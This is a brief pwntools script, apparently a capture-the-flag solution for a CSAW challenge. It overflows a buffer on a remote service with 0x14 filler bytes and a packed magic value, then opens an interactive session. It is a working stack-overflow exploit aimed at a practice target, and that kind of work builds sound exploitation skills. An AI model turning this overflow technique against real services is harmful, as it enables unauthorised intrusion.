from pwn import *

r = process('./boi')
r = remote('pwn.chal.csaw.io', 9000)

r.send('A'*0x14+p32(0xCAF3BAEE))
r.interactive()
